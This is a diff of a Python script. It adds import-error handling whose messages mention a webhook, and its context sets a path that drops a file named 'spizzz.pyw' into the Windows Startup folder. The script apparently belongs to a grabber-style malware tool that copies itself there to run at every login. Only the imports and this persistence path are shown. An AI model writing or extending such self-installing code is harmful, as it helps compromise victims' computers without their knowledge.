@@ -1,14 +1,21 @@
 import os
 from os.path import isfile
 from os import getenv, startfile
-import requests
 from shutil import copy
 from urllib.request import Request, urlopen
 from json import loads
 try:
+    import requests
+except ImportError:
+    input(
+        f"Module requests not installed, to install run '{'pip' if os.name == 'nt' else 'pip3'} install requests'\nYou can ignore this error if you aren't going to use a webhook.\nPress enter to exit")
+    exit()
+try:
     import random
-except:
-    print("pip3 install random")
+except ImportError:
+    input(
+        f"Module random not installed, to install run '{'pip' if os.name == 'nt' else 'pip3'} install random'\nYou can ignore this error if you aren't going to use a webhook.\nPress enter to exit")
+    exit()
 
 path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/spizzz.pyw" % getenv("userprofile")
 
